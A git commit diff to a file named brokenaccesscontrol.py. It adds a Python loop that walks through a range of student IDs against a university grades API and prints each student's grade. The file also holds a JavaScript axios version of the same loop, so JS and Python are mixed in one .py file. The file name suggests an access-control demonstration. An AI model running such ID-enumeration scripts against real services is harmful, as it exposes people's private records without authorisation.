302c8d264b8a035fd4317ffae5baccac0b86fc80
SiddaLavaOfJava04 <72814478+SiddaLavaOfJava04@users.noreply.github.com>
2024-02-19 21:19:45 -0500

    Update brokenaccesscontrol.py

--- brokenaccesscontrol.py
+++ brokenaccesscontrol.py
@@ -1,4 +1,10 @@
 import axios from 'axios'
+import requests, json
+
+for id in range(1111,9999):
+    response = requests.get('https://api.grades.patch.edu/grades?subjectID=1293&studentID=2022' + str(id))
+    json_response = json.loads(response.text)
+    print("Student: 2022" + str(id) + ", Grade: " + json_response['grade']) 
 
 for (let id = 1111; id < 9999; id++) {
     axios
